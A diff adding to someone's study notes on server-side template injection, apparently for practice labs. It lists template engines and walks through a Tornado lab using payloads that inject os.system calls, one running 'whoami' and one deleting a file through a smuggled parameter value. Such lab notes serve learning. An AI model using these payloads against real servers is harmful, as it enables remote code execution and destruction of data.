@@ -94,6 +94,15 @@ Razor (.Net):
 
 --------------------------------------------------------------------
 
+FreeMarker - Java-based template engine
+Velocity - Java-based template engine
+Smarty - PHP Template engine
+Twig - PHP Template engine
+Jade - Node.js Template engine
+Jinja2 - Python/Flask Template engine
+
+-----------------------------------------------------------------------
+
 #1 Lab: Basic server-side template injection
 
     1.check where website is sending response 
@@ -103,4 +112,12 @@ Razor (.Net):
 
 --------------------------------------------------------------------------------------------------------------------------
 
-#2 Lab
+#2 Lab:Basic server-side template injection (code context)
+
+     1.Send request POST /my-account/change-blog-post-author-display HTTP/2 to repeater
+     2.Entered the payload {% import os %}{{os.system('whoami')}} in comment section and it reflected that system is using tornado template .
+     2.Final payload:- blog-post-author-display=user.name }}{% import os %}{{os.system('rm /home/carlos/morale.txt' )}}
+
+
+
+PREVENTION OF SSTI:- The best way to prevent server-side template injection is to not allow any users to modify or submit new templates
